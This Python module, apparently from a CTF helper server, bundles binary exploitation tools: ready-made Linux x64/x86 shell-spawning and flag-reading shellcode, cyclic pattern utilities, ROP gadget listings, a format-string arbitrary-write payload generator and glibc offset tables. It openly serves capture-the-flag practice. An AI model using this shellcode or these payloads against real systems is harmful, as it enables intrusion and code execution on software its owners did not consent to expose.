"""
Pwn Tools Module for CTF-MCP
Binary exploitation helpers: shellcode, patterns, ROP, format strings
"""

import struct
from typing import Optional


class PwnTools:
    """Binary exploitation tools for CTF challenges"""

    def get_tools(self) -> dict:
        """Return available tools and their descriptions"""
        return {
            "shellcode_gen": "Generate shellcode",
            "pattern_create": "Create cyclic pattern",
            "pattern_offset": "Find pattern offset",
            "rop_gadgets": "Common ROP gadgets",
            "format_string": "Format string exploit",
            "libc_offset": "Calculate libc base",
        }

    # === Shellcode ===

    SHELLCODES = {
        "x64": {
            "linux": {
                "execve": (
                    "\\x48\\x31\\xf6"              # xor rsi, rsi
                    "\\x56"                        # push rsi
                    "\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68"  # movabs rdi, '/bin//sh'
                    "\\x57"                        # push rdi
                    "\\x54"                        # push rsp
                    "\\x5f"                        # pop rdi
                    "\\x48\\x31\\xd2"              # xor rdx, rdx
                    "\\x48\\xc7\\xc0\\x3b\\x00\\x00\\x00"  # mov rax, 59
                    "\\x0f\\x05"                   # syscall
                ),
                "read_flag": (
                    # open("flag.txt", 0)
                    "\\x48\\x31\\xc0"              # xor rax, rax
                    "\\x48\\x31\\xf6"              # xor rsi, rsi
                    "\\x48\\x31\\xd2"              # xor rdx, rdx
                    "\\x48\\xbb\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74"  # mov rbx, 'flag.txt'
                    "\\x53"                        # push rbx
                    "\\x48\\x89\\xe7"              # mov rdi, rsp
                    "\\xb0\\x02"                   # mov al, 2 (open)
                    "\\x0f\\x05"                   # syscall
                    # read(fd, buf, 100)
                    "\\x48\\x89\\xc7"              # mov rdi, rax
                    "\\x48\\x89\\xe6"              # mov rsi, rsp
                    "\\x48\\xc7\\xc2\\x64\\x00\\x00\\x00"  # mov rdx, 100
                    "\\x48\\x31\\xc0"              # xor rax, rax (read)
                    "\\x0f\\x05"                   # syscall
                    # write(1, buf, rax)
                    "\\x48\\x89\\xc2"              # mov rdx, rax
                    "\\x48\\xc7\\xc7\\x01\\x00\\x00\\x00"  # mov rdi, 1
                    "\\x48\\xc7\\xc0\\x01\\x00\\x00\\x00"  # mov rax, 1 (write)
                    "\\x0f\\x05"                   # syscall
                ),
            },
        },
        "x86": {
            "linux": {
                "execve": (
                    "\\x31\\xc0"                   # xor eax, eax
                    "\\x50"                        # push eax
                    "\\x68\\x2f\\x2f\\x73\\x68"    # push '//sh'
                    "\\x68\\x2f\\x62\\x69\\x6e"    # push '/bin'
                    "\\x89\\xe3"                   # mov ebx, esp
                    "\\x50"                        # push eax
                    "\\x53"                        # push ebx
                    "\\x89\\xe1"                   # mov ecx, esp
                    "\\x31\\xd2"                   # xor edx, edx
                    "\\xb0\\x0b"                   # mov al, 11
                    "\\xcd\\x80"                   # int 0x80
                ),
            },
        },
    }

    def shellcode_gen(self, arch: str = "x64", os: str = "linux", sc_type: str = "execve") -> str:
        """Generate shellcode for various architectures"""
        result = [f"Shellcode ({arch}/{os}/{sc_type}):", "-" * 50]

        if arch in self.SHELLCODES and os in self.SHELLCODES[arch]:
            if sc_type in self.SHELLCODES[arch][os]:
                shellcode = self.SHELLCODES[arch][os][sc_type]

                # Format as C string
                result.append(f"C string:\n{shellcode}")

                # Format as bytes
                raw_bytes = shellcode.replace("\\x", "")
                result.append(f"\nHex:\n{raw_bytes}")

                # Format as Python bytes
                result.append(f"\nPython:\nb'{shellcode}'")

                # Length
                byte_len = len(bytes.fromhex(raw_bytes))
                result.append(f"\nLength: {byte_len} bytes")

                # Null byte check
                if "00" in raw_bytes:
                    result.append("\n[!] Warning: Contains NULL bytes!")
                else:
                    result.append("\n[+] No NULL bytes")
            else:
                result.append(f"Unknown shellcode type. Available: {list(self.SHELLCODES[arch][os].keys())}")
        else:
            result.append(f"Architecture/OS not supported")
            result.append(f"Available: {list(self.SHELLCODES.keys())}")

        return '\n'.join(result)

    # === Cyclic Patterns ===

    def pattern_create(self, length: int = 100) -> str:
        """Create cyclic pattern for buffer overflow testing"""
        charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        charset2 = "abcdefghijklmnopqrstuvwxyz"
        charset3 = "0123456789"

        pattern = []
        for c1 in charset:
            for c2 in charset2:
                for c3 in charset3:
                    if len(pattern) >= length:
                        break
                    pattern.extend([c1, c2, c3])
                if len(pattern) >= length:
                    break
            if len(pattern) >= length:
                break

        pattern_str = ''.join(pattern[:length])

        result = [
            f"Cyclic Pattern (length={length}):",
            "-" * 50,
            pattern_str,
            "",
            f"As bytes: {pattern_str.encode()}",
            f"Hex: {pattern_str.encode().hex()}",
        ]

        return '\n'.join(result)

    def pattern_offset(self, value: str) -> str:
        """Find offset in cyclic pattern"""
        # Generate a large pattern
        charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        charset2 = "abcdefghijklmnopqrstuvwxyz"
        charset3 = "0123456789"

        pattern = []
        for c1 in charset:
            for c2 in charset2:
                for c3 in charset3:
                    pattern.extend([c1, c2, c3])

        pattern_str = ''.join(pattern)

        result = [f"Pattern Offset Search:", "-" * 50]

        # If hex value, try different endianness
        if value.startswith("0x") or all(c in "0123456789abcdefABCDEF" for c in value):
            hex_val = value.replace("0x", "")
            if len(hex_val) % 2:
                hex_val = "0" + hex_val

            # Little endian
            le_bytes = bytes.fromhex(hex_val)[::-1]
            try:
                le_str = le_bytes.decode('ascii')
                offset = pattern_str.find(le_str)
                if offset != -1:
                    result.append(f"[!] Found (little-endian): offset = {offset}")
            except:
                pass

            # Big endian
            be_bytes = bytes.fromhex(hex_val)
            try:
                be_str = be_bytes.decode('ascii')
                offset = pattern_str.find(be_str)
                if offset != -1:
                    result.append(f"[!] Found (big-endian): offset = {offset}")
            except:
                pass

        # String search
        offset = pattern_str.find(value)
        if offset != -1:
            result.append(f"[!] Found (string): offset = {offset}")
        else:
            result.append(f"[-] Pattern '{value}' not found")

        return '\n'.join(result)

    # === ROP Gadgets ===

    def rop_gadgets(self, arch: str = "x64", gadget_type: str = "all") -> str:
        """Common ROP gadget patterns"""
        gadgets = {
            "x64": {
                "pop_rdi": "pop rdi; ret  -> 0x5f c3",
                "pop_rsi": "pop rsi; ret  -> 0x5e c3",
                "pop_rdx": "pop rdx; ret  -> 0x5a c3",
                "pop_rax": "pop rax; ret  -> 0x58 c3",
                "pop_rbx": "pop rbx; ret  -> 0x5b c3",
                "pop_rcx": "pop rcx; ret  -> 0x59 c3",
                "pop_rsp": "pop rsp; ret  -> 0x5c c3",
                "pop_rbp": "pop rbp; ret  -> 0x5d c3",
                "syscall": "syscall; ret  -> 0x0f 05 c3",
                "ret": "ret           -> 0xc3",
                "leave_ret": "leave; ret    -> 0xc9 c3",
                "pop_rdi_rsi": "pop rdi; pop rsi; ret",
            },
            "x86": {
                "pop_eax": "pop eax; ret  -> 0x58 c3",
                "pop_ebx": "pop ebx; ret  -> 0x5b c3",
                "pop_ecx": "pop ecx; ret  -> 0x59 c3",
                "pop_edx": "pop edx; ret  -> 0x5a c3",
                "int_0x80": "int 0x80      -> 0xcd 80",
                "ret": "ret           -> 0xc3",
                "leave_ret": "leave; ret    -> 0xc9 c3",
            },
        }

        result = [f"ROP Gadgets ({arch}):", "-" * 50]

        if arch not in gadgets:
            return f"Unknown architecture. Available: {list(gadgets.keys())}"

        arch_gadgets = gadgets[arch]

        if gadget_type == "all":
            for name, gadget in arch_gadgets.items():
                result.append(f"  {name}: {gadget}")
        elif gadget_type in arch_gadgets:
            result.append(f"  {gadget_type}: {arch_gadgets[gadget_type]}")
        else:
            return f"Unknown gadget. Available: {list(arch_gadgets.keys())}"

        result.append("")
        result.append("Search with: ROPgadget --binary <file> --only 'pop|ret'")
        result.append("Or: ropper -f <file> --search 'pop rdi'")

        return '\n'.join(result)

    # === Format String ===

    def format_string(self, target_addr: str, value: str, offset: int, arch: str = "x64") -> str:
        """Generate format string exploit payload"""
        target = int(target_addr, 16)
        val = int(value, 16)

        result = [
            "Format String Exploit:",
            "-" * 50,
            f"Target address: {hex(target)}",
            f"Value to write: {hex(val)}",
            f"Offset: {offset}",
            f"Architecture: {arch}",
            "",
        ]

        ptr_size = 8 if arch == "x64" else 4

        # Split value into bytes for writing
        if arch == "x64":
            # Write 2 bytes at a time using %hn
            writes = []
            for i in range(4):
                byte_val = (val >> (i * 16)) & 0xFFFF
                addr = target + i * 2
                writes.append((addr, byte_val))

            result.append("Write plan (using %hn - 2 bytes each):")
            for addr, byte_val in writes:
                result.append(f"  {hex(addr)} <- {hex(byte_val)} ({byte_val})")

            result.append("")
            result.append("Payload template (Python):")
            result.append(f"""
# Format string payload generator
target = {hex(target)}
value = {hex(val)}
offset = {offset}

# Build payload
payload = b""
writes = []
for i in range(4):
    byte_val = (value >> (i * 16)) & 0xFFFF
    addr = target + i * 2
    writes.append((addr, byte_val))

# Sort by value for proper %n ordering
writes.sort(key=lambda x: x[1])

# Add addresses first
for addr, _ in writes:
    payload += struct.pack('<Q', addr)

# Add format specifiers
current = 0
for i, (_, val) in enumerate(writes):
    to_print = (val - current) % 0x10000
    if to_print > 0:
        payload += f"%{{to_print}}c".encode()
    payload += f"%{{{offset + i}}}$hn".encode()
    current = val

print(payload)
""")

        return '\n'.join(result)

    # === Libc ===

    LIBC_OFFSETS = {
        "2.31": {
            "puts": 0x84420,
            "printf": 0x64e10,
            "system": 0x55410,
            "execve": 0xe62f0,
            "/bin/sh": 0x1b45bd,
            "__libc_start_main": 0x26fc0,
        },
        "2.27": {
            "puts": 0x809c0,
            "printf": 0x64e80,
            "system": 0x4f440,
            "/bin/sh": 0x1b3e9a,
        },
        "2.23": {
            "puts": 0x6f690,
            "printf": 0x55800,
            "system": 0x45390,
            "/bin/sh": 0x18cd57,
        },
    }

    def libc_offset(self, leaked_addr: str, symbol: str, libc_version: str = "2.31") -> str:
        """Calculate libc base from leaked address"""
        leaked = int(leaked_addr, 16)

        result = [
            "Libc Base Calculation:",
            "-" * 50,
            f"Leaked address: {hex(leaked)}",
            f"Symbol: {symbol}",
            f"Libc version: {libc_version}",
            "",
        ]

        if libc_version in self.LIBC_OFFSETS:
            offsets = self.LIBC_OFFSETS[libc_version]
            if symbol in offsets:
                symbol_offset = offsets[symbol]
                libc_base = leaked - symbol_offset

                result.append(f"Symbol offset: {hex(symbol_offset)}")
                result.append(f"[!] Libc base: {hex(libc_base)}")
                result.append("")
                result.append("Other useful addresses:")
                for name, offset in offsets.items():
                    result.append(f"  {name}: {hex(libc_base + offset)}")
            else:
                result.append(f"Unknown symbol. Available: {list(offsets.keys())}")
        else:
            result.append(f"Unknown libc version. Available: {list(self.LIBC_OFFSETS.keys())}")
            result.append("")
            result.append("Use libc.rip or libc-database to find offsets")

        return '\n'.join(result)

    # === Packing/Unpacking ===

    def pack(self, value: int, bits: int = 64, endian: str = "little") -> str:
        """Pack integer to bytes"""
        fmt = {
            (32, "little"): "<I",
            (32, "big"): ">I",
            (64, "little"): "<Q",
            (64, "big"): ">Q",
        }

        if (bits, endian) not in fmt:
            return "Invalid bits/endian combination"

        packed = struct.pack(fmt[(bits, endian)], value)
        return f"Packed: {packed}\nHex: {packed.hex()}\nPython: {packed}"

    def unpack(self, data: str, bits: int = 64, endian: str = "little") -> str:
        """Unpack bytes to integer"""
        fmt = {
            (32, "little"): "<I",
            (32, "big"): ">I",
            (64, "little"): "<Q",
            (64, "big"): ">Q",
        }

        if (bits, endian) not in fmt:
            return "Invalid bits/endian combination"

        try:
            byte_data = bytes.fromhex(data.replace(" ", "").replace("0x", ""))
            value = struct.unpack(fmt[(bits, endian)], byte_data.ljust(bits // 8, b'\x00'))[0]
            return f"Unpacked: {value}\nHex: {hex(value)}"
        except Exception as e:
            return f"Unpack error: {e}"
